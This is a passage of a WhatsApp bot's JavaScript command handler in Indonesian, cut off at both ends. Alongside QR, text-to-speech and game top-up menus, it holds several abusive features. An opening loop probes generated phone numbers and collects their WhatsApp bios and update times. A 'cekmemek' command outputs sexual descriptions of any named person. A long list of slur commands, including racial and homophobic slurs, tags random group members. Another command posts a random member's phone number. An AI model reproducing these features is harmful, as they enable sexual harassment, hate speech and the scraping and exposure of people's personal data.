            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await slime.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await slime.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
 case'tozombie':{
 if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
await slime.sendMessage(m.chat, {image: {url: data.url}, caption: mess.done}, {quoted:m})
}
break
case'cekkhodam': case 'khodam': case 'checkkhodam': {
 if (!text) return m.reply('Nama nya mana yang mau di cek khodam nya, \nExample .cekkhodam SlimexTzy')
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)]
}
  reply(`
╭━━━━°「 *Khodam ${text}* 」°
> *Nama* : *\`${text}\`*
> *Khodam* : ${pickRandom(['Macan Tutul', 'Gajah Sumatera', 'Pipa paralon', 'Orangutan', 'Harimau Putih', 'Badak Jawa', 'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana', 'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa', 'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Setan Merah', 'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang', 'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung', 'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar', 'Burung Hantu', 'Ikan Cupang', 'Gagang pintu', 'Setrika', 'Naga Biru', 'Elang Merah', 'Naga Api', 'Naga Es', 'Naga Kepala Tiga', 'Tuyul', 'Ular Kadut', 'Teh Sarimurni', 'Es Dawet', 'Jam dinding', 'Opah', 'Jarjit Singh', 'Upin', 'Ipin', 'Ehsan', 'Pak Somat Dudung', 'Pak RT', 'Pak Lurah', 'Sedotan', 'Sungut Lele', 'Ambatron', 'Ambatukam', 'Rusdi', 'Papan Triplek', 'Naga Kepala Dua', 'Siluman Kelelawar', 'Naga Kepala Empat', 'King of All Khodam'])}
> *Mendampingi dari* : ${pickRandom(['1 tahun lalu','2 tahun lalu','3 tahun lalu','4 tahun lalu','dari lahir'])}
> *Alasan Mendampingi* : ${pickRandom(['Tertarik Kepadamu','Dia Menyukaimu','Ingin Melindungimu','Perintah Dari Leluhur','Gabut'])}
> *Kekuatan* : ${pickRandom(['Mampu melindungi pemiliknya dari roh jahat','Bisa memberikan keberuntungan kepada pemiliknya','Teleportasi','Mengabulkan semua keinginan pemiliknya','Tidur','Masih pemula gaada kekuatannya'])}
> *Expired* : ${pickRandom(['Akhir Tahun ini','2025','2026','2027','2028','2029','2030','2031','2032','2033','2034','2035','Sampai Mati','2087','2076','2029','2080'])}
╰═┅═━––––––๑
`)
}
break
case "createqr":
case "qr": {
const qrcode = require('qrcode')
if (!text) return reply(`Penggunaan Salah\n contoh : ${prefix+command} Haii`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
slime.sendMessage(from, { image: data, caption: `Nih Qr Codenya, reply dengan pesan *.readqr* untuk mendeteksi text yang sudah dibuat menjadi Qr` }, { quoted: m })
}
break
case "detectqr":
case "readqr":
if (/image\/(jpe?g|png)/.test(mime)) {
try {
mee = await slime.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
const res123 = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res123.json() 
reply(util.format(data[0]))
} catch (err) {
reply(`Reply Image Yang Ada Qr Nya`)
}
}
break
case 'cekjodoh': case 'jodohcek': {
    const defaultLang = 'id';
    const gtts = require( 'node-gtts')
    // Penanganan input nama
    let lana;
    if (args.length === 0 || !args[0]) {
        return m.reply('Harap masukkan nama kamu.');
    } else {
        lana = args[0];
    }

    let lang = args[1];
    if (!lang || lang.length !== 2) {
        lang = defaultLang;
    }
    
    const khodam = [
  "Gebetan kamu",
  "Pacar kamu",
  "Seseorang yang kamu suka sekarang",
  "Guru Kamu",
  "Mimi peri",
  "Seseorang yang kamu anggap jelek dulu"
  
];


    const randomKhodam = khodam[Math.floor(Math.random() * khodam.length)];
    let text = `Jodoh ${lana} adalah ${randomKhodam}`;
function tts(text, lang = 'id') {
return new Promise((resolve, reject) => {
try {
let tts = gtts(lang)
let filePath =  (1 * new Date) + '.mp3'
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}    
    


    let res;
    try {
        res = await tts(text, lang);
    } catch (e) {
        m.reply(e + '');
        res = await tts(text, defaultLang);
    } finally {
        reply(text)
        if (res) {
await slime.sendMessage(m.chat, { audio: res, ptt: true, mimetype: "audio/mpeg", fileName: "vn.mp3", waveform: [100, 0, 100, 0, 100, 0, 100] }, { quoted: m });
        }
    }
};
break
case 'sendch':
if (!isCreator) return reply('Ngapain? fitur ini khusus owner!')
    if (!m.quoted) return reply(`Reply audio ${prefix}${command}`)
    if(isMedia || q) {
        try {
            reply('Done')
            let media = await m.quoted.download();
            slime.sendMessage('120363325328533494@newsletter', { audio: media }, { quoted: m })
        } catch (err) {
            reply(`Audio tidak ditemukan!\nCoba untuk ulangi kirim/reply audio`)
        }
    } else {
        reply(`Reply audio`)
    }
    break;

case 'quote': {
  try {
    if (!q) return m.reply(`contoh\n\nquote dingin tapi tidak mematikan`);
// wm avs
    const { createCanvas, loadImage } = require('canvas');
    const fs = require('fs');
    const path = require('path');
// wm avs
    const canvasWidth = 800;
    const canvasHeight = 400;
    const canvas = createCanvas(canvasWidth, canvasHeight);
    const ctx = canvas.getContext('2d');
// wm avs
    ctx.fillStyle = '#ffffff'; //serah kalian kalau mau ubah warna
    ctx.fillRect(0, 0, canvasWidth, canvasHeight);
// wm avs
    ctx.fillStyle = '#000000';
    ctx.font = 'bold 32px Arial';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
// wm avs
    const words = q.split(' ');
    const lines = [];
    let currentLine = '';
// wm avs    
    words.forEach(word => {
      const testLine = currentLine + word + ' ';
      const testWidth = ctx.measureText(testLine).width;
      if (testWidth > canvasWidth - 40) {
        lines.push(currentLine);
        currentLine = word + ' ';
      } else {
        currentLine = testLine;
      }
    });
    lines.push(currentLine);
// wm avs
    const lineHeight = 40;
    const textY = (canvasHeight - (lines.length * lineHeight)) / 2;
// wm avs
    lines.forEach((line, index) => {
      ctx.fillText(line.trim(), canvasWidth / 2, textY + (index * lineHeight));
    });
// wm avs
    const outputPath = path.join(__dirname, 'quote.png');
    const out = fs.createWriteStream(outputPath);
    const stream = canvas.createPNGStream();
    stream.pipe(out);
// wm avs
    out.on('finish', async () => {
      await slime.sendMessage(from, { image: { url: outputPath }, caption: '_done nih_.', fileName: 'quote.png' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
// wm avs
} catch (err) {
    console.error(err);
    m.reply('error bntar.');
  }
}
break
case 'pixel-art':
  if (!text) return m.reply('masukkan prompt nya')
  try {
    m.reply('*Process generating image, mungkin membutuhkan waktu yang lama*')
    let pix = await (await fetch('https://api.shannmoderz.xyz/ai/pixel-art?prompt=' + text)).json()
    let shannz = pix.result[0]
    slime.sendMessage(m.chat, { image: { url: shannz }, caption: 'Ini dia dek' }, { quoted: m })
} catch (e) {
    m.reply('*terjadi kesalahan:*' + e)
}
break
case 'flux':
 if (!text) return m.reply('masukkan prompt nya')
  try {
    m.reply('*Process generating image, mungkin membutuhkan waktu yang lama*')
    let pix = await (await fetch('https://api.shannmoderz.xyz/ai/flux-schnell?prompt=' + text)).json()
    let shannz = pix.result[0]
    slime.sendMessage(m.chat, { image: { url: shannz }, caption: 'Ini dia hasilnya dek' }, { quoted: m })
} catch (e) {
    m.reply('*terjadi kesalahan:*' + e)
}
break
 case 'cekmemek': {
 if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!text) return reply('Ketik Namanya Tolol!')
reply(`
╭━━━━°「 *Memek ${text}* 」°
┃
┊• Nama : ${text}
┃• memek : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• lubang : ${pickRandom(['perawan','ga perawan','udah pernah dimasukin','masih rapet','tembem'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
╰═┅═━––––––๑`)
}
break
 case 'namaninja': {    
 if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
reply(teks.replace(/[a-z]/gi, v => {
return {
'a': 'ka',
'b': 'tu',
'c': 'mi',
'd': 'te',
'e': 'ku',
'f': 'lu',
'g': 'ji',
'h': 'ri',
'i': 'ki',
'j': 'zu',
'k': 'me',
'l': 'ta',
'm': 'rin',
'n': 'to',
'o': 'mo',
'p': 'no',
'q': 'ke',
'r': 'shi',
's': 'ari',
't': 'ci',
'u': 'do',
'v': 'ru',
'w': 'mei',
'x': 'na',
'y': 'fu',
'z': 'zi'
}[v.toLowerCase()] || v
}))
}
break
case 'hdvideo': {
  const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? slime.user.jid : m.sender;
  const q = m.quoted ? m.quoted : m;
  const mime = (q.msg || q).mimetype || '';
  if (!mime) return m.reply(`Vidio nya mana?`);
  m.reply("wait..");
  const media = await slime.downloadAndSaveMediaMessage(q);
  const url = await TelegraPH(media);
  const output = 'output.mp4'; 
  
  exec(`ffmpeg -i ${media} -vf "hqdn3d=1.5:1.5:6:6,nlmeans=p=7:s=7,vaguedenoiser=threshold=2.1:method=soft:nsteps=5,deband,atadenoise,unsharp=3:3:0.6,eq=brightness=0.05:contrast=1.2:saturation=1.1" -vcodec libx264 -profile:v main -level 4.1 -preset veryslow -crf 18 -x264-params ref=4 -acodec copy -movflags +faststart ${output}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);

    slime.sendMessage(m.chat, { caption: `_Success To Enhanced Video_`, video: { url: output }}, {quoted: m});
  });
  
            
}
break
 case 'caritemangc': 
case 'carikawangc': {
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!m.isGroup) return reply(mess.group)
if (participants.length === 0) {
return reply('Tidak ada anggota di group.');
}
const member = participants.map(u => u.id).filter(v => v !== slime.user.jid);
if (member.length === 0) {
return reply('Tidak ada anggota non-bot di group.');
}
const phoneNumber = member[Math.floor(Math.random() * member.length)];
const waLink = `https://wa.me/${phoneNumber.split("@")[0]}`;
await sleep(1000);
reply('Sedang mencari...');
await sleep(4000);
reply('Berhasil mendapatkan satu orang');
await sleep(3000);
slime.sendMessage(m.chat, { text: `Nih Dek ${phoneNumber.split("@")[0]}\n\n${waLink}` }, m);
}
break

    case 'tiktokaudio': case 'ttsong': case 'ttmp3': {
if (!text) return reply( `Example : ${prefix + command} link`)
     if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(`Tunggu sebentar ya dek:>`)
require('./lib/tiktok').Tiktok(q).then( data => {
slime.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
     case 'jodoh': {
            if (!m.isGroup) return m.reply('Khusus Group oyy\nSilahkan join group bot : https://linktr.ee/slimextzy')
                 if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
slime.sendMessage(m.chat,
{ text: `👩‍❤️‍👨 Jodohmu Adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./SlimeMedia/image/slime.jpg`),
"sourceUrl": `wa.me/+6283167532721`}}},
{ quoted: m})        
            }
            break
            case "darkjoke": case "darkjokes":
await loading()
 var ress = await Darkjokes()
teks = "*Darkjokes*"
slime.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:m })
            break
            case 'kobo': {
if (!isCreator) return reply('*Khusus Premium*')
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (ChatBot) return reply('Sudah Aktif')
chatbot.push(from)
reply('Succes menyalakan kobo di group ini 🌷')
} else if (args[0] === "off") {
if (!ChatBot) return reply('Sudah Mati')
let off = ntilink.indexOf(from)
chatbot.splice(off, 1)
reply('Succes mematikan kobo di group ini 🌷')
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'topup': {
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: wm
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Pubg","id":"${prefix}pubg"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Free Fire","id":"${prefix}ff"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Mobile Legend","id":"${prefix}ml"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                                newsletterName: saluran,
                                newsletterJid: '12345678',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break
case 'ml': {
let sections = [{
title: 'Menu Sewa',
highlight_label: 'Recomended',
rows: [{
title: '36 Diamond',
description: `11K`, 
id: `.payment`
},
{
title: '44 Diamond',
description: "12k", 
id: `.payment`
},
{
title: '56 Diamond', 
description: "16k", 
id: `.payment`
},
{
title: '86 Diamond', 
description: "23K", 
id: `.payment`
},
{
title: '112 Diamond', 
description: "31K", 
id: `.payment`
},
{
title: '429 Diamond', 
description: "109K", 
id: `.payment`
},
{
title: '600 Diamons', 
description: "162K", 
id: `.payment`
}]
}]

let listMessage = {
    title: 'List Sewa', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363325328533494@newsletter',
 newsletterName: 'Powered By LynnZxD', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: slime.decodeJid(slime.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Ayo Topup ml Skrng!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋🏻*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: slime.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'ff': {
let sections = [{
title: 'Menu Sewa',
highlight_label: 'Recomended',
rows: [{
title: '70 Diamond',
description: `10K`, 
id: `.payment`
},
{
title: '100 Diamond',
description: "15k", 
id: `.payment`
},
{
title: '140 Diamond', 
description: "20k", 
id: `.payment`
},
{
title: '210 Diamond', 
description: "30k", 
id: `.payment`
},
{
title: '355 Diamond', 
description: "47K", 
id: `.payment`
},
{
title: '1000 Diamond', 
description: "131K", 
id: `.payment`
},
{
title: '1450 Diamons', 
description: "182K", 
id: `.payment`
}]
}]

let listMessage = {
    title: 'List Sewa', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363325328533494@newsletter',
 newsletterName: 'Powered By LynnZxD', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: slime.decodeJid(slime.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Ayo Topup ff Skrng!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋🏻*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: slime.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'pubg': {
let sections = [{
title: 'Menu Sewa',
highlight_label: 'Recomended',
rows: [{
title: '70 uc',
description: `21K`, 
id: `.payment`
},
{
title: '100 uc',
description: "27k", 
id: `.payment`
},
{
title: '125 uc', 
description: "33k", 
id: `.payment`
},
{
title: '200 uc', 
description: "47K", 
id: `.payment`
},
{
title: '300 uc', 
description: "67K", 
id: `.payment`
},
{
title: '500 uc', 
description: "102K", 
id: `.payment`
},
{
title: '750 uc', 
description: "154K", 
id: `.payment`
}]
}]

let listMessage = {
    title: 'List Sewa', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363325328533494@newsletter',
 newsletterName: 'Powered By LynnZxD', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: slime.decodeJid(slime.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Ayo Topup pubgl Skrng!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋🏻*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: slime.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'cekkodam':
case 'cekkhodam2':{
  if (!text) return reply('Nama nya mana yang mau di cek khodam nya');
  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }
  const ceknyaa = pickRandom(['Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa', 'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana', 'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa', 'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Setan Merah', 'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang', 'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung', 'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar', 'Burung Hantu', 'Ikan Cupang']);
  const damping = pickRandom(['1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'lahir']);
  const khodam = `khodam ${text}, adalah ${ceknyaa}, mendampingi dari ${damping}`;

  slime.sendMessage(m.chat, {audio: {url: `https://nue-api.vercel.app/api/tts?lang=id&text=${khodam}`}, mimetype: 'audio/mpeg', ptt: true }, {quoted: m});
}
  break
case 'wtssc': {
reply(` *WTS*

_SCRIPT HANAKO AI V9_
_TYPE CASE_

BASE : SLIMEXTZY
FEATURE : SLIMEXTZY
PENGEMBAN : SLIMEXTZY

*FEATURE? CEK SENDIRI*
wa.me/+6285715430424
`)
}
break
 case 'xxxxplay':{
if (!text) return reply(`Example : ${prefix+command} story wa anime`)
reply(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
slime.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
case `@6283167532721`: {
m.reply('_*Apaansi Tag-Tag No Owner Ku Dek?*_')
}
break
 case 'tolol':
      case 'gaguna':
      case 'jomok':
      case 'idiot':
      case 'gay':
      case 'lesbi':
      case 'anjink':
      case 'babi':
      case 'kucing':
      case 'beban':
      case 'bebankeluarga':
      case 'gadakeluarga':
      case 'miskin':
      case 'sampah':
      case 'wibu':
      case 'cantik':
      case 'ganteng':
      case 'tampan':
      case 'cute':
      case 'kind':
      case 'Islam':
      case 'kristen':
      case 'hindu':
      case 'katolik':
      case 'gandu':
      case 'madarchod':
      case 'kala':
      case 'gora':
      case 'chutiya':
      case 'nibba':
      case 'nibbi':
      case 'bhosdiwala':
      case 'chutmarika':
      case 'bokachoda':
      case 'suarerbaccha':
      case 'bolochoda':
      case 'muthal':
      case 'muthbaaz':
      case 'randibaaz':
      case 'topibaaz':
      case 'cunt':
      case 'nerd':
      case 'behenchod':
      case 'behnchoda':
      case 'bhosdika':
      case 'nerd':
      case 'mc':
      case 'bsdk':
      case 'bhosdk':
      case 'nigger':
      case 'loda':
      case 'laund':
      case 'nigga':
      case 'noobra':
      case 'tharki':
      case 'nibba':
      case 'nibbi':
      case 'mumu':
      case 'rascal':
      case 'scumbag':
      case 'nuts':
      case 'comrade':
      case 'fagot':
      case 'scoundrel':
      case 'ditch':
      case 'dope':
      case 'gucci':
      case 'lit':
      case 'dumbass':
      case 'sexy':
      case 'crackhead':
      case 'mf':
      case 'motherfucker':
      case 'dogla':
      case 'bewda':
      case 'boka':
      case 'khanki':
      case 'bal':
      case 'sucker':
      case 'fuckboy':
      case 'playboy':
      case 'fuckgirl':
      case 'playgirl':
      case 'hot': {
if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
slime.sendMessage(m.chat,
{ text: `The Most ${command} Here Is @${org.split('@')[0]}`,
contextInfo:{
mentionedJid:[org],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./SlimeMedia/image/slime.jpg`),
"sourceUrl": `http://wa.me/+6283167532721`}}},
{ quoted: m})
}
break
        case "sad1":
        case "sad2":
        case "sad3":
        case "sad4":
        case "sad5":
        case "sad6":
        case "sad7":
        case "sad8":
        case "sad9":
        case "sad10":
        case "sad11":
        case "sad12":
        case "sad13":
        case "sad14":
        case "sad15":
        case "sad16":
        case "sad17":
        case "sad18":
        case "sad19":
        case "sad20":
        case "sad21":
        case "sad22":
        case "sad23":
        case "sad24":
        case "sad25":
        case "sad26":
        case "sad27":
        case "sad28":
        case "sad29":
        case "sad30":
        case "sad31":
        case "sad32":
        case "sad33":
        case "sad34":
        case "sad35":
              bayuamore_dev = await getBuffer(
          `https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
         );
         await slime.sendMessage(
          m.chat,
          {
           audio: bayuamore_dev,
           mimetype: "audio/mp4",
           ptt: true,
          },
          { quoted: m }
         );
         break;  
case 'buylimit': {
reply(` Price List Sewa

  • Infinty limited ( 30k )
  • 20 Limited ( 3k )
  • 30 Limited ( 6k )
  • 40 Limited ( 10k )
  • 50 limited ( 13k )
  • 60 limited ( 16k )
  • 100 limited ( 20k )
  
  Example : .buylimit20
`)
}
break
case 'buylimit20': {
reply(`3Rb Silahkan Ketik .pembayaran`)
}
break
case 'buylimit30': {
reply(`6Rb Silahkan Ketik .pembayaran`)
}
break
case 'buylimit40': {
reply(`10Rb Silahkan Ketik .pembayaran`)
}
break
case 'buylimit50': {
reply(`13kRb Silahkan Ketik .pembayaran`)
}
break
case 'buylimit60': {
reply(`16kRb Silahkan Ketik .pembayaran`)
}
break
case 'buylimit100': {
reply(`20Rb Silahkan Ketik .pembayaran`)
}
break
case 'buylimitinfinty': {
reply(`30Rb Silahkan Ketik .pembayaran`)
}
break
 /* 

Credits: SlimexTzy
Jenis fitur: mencari tokoh terkenal maupun legenda

*/
case 'siapakah':
case 'sk': {
  async function siapakah(query) {
    let response = await axios.get(`https://www.google.com/search?q=Siapakah ${query}&hl=id`)

    let $ = cheerio.load(response.data)
    let result = {
      result: []
    }
    let content = $('div[class="BNeawe tAd8D AP7Wnd"]').text()
    
    result.result.push(
      content
        .replace('tampilkan semua', '')
        .replace('Tampilkan Semua', '')
        .replace('Tampilkan semua', '')
        .replace('tampilkan Semua', '')
        .replace('TAMPILKAN SEMUA', '')
        .replace(/[0-9]/g, '') 
    )
    
    return result
  }
  if (!text) return reply(`*Format Seperti Ini:* ${command} jokowi\n\nFitur Masih Dalam Pengembangan`)
  siapakah(text).then(response => {
    if (response.result[0].length < 1) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('tidak cocok')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('yang lain')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('maps')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
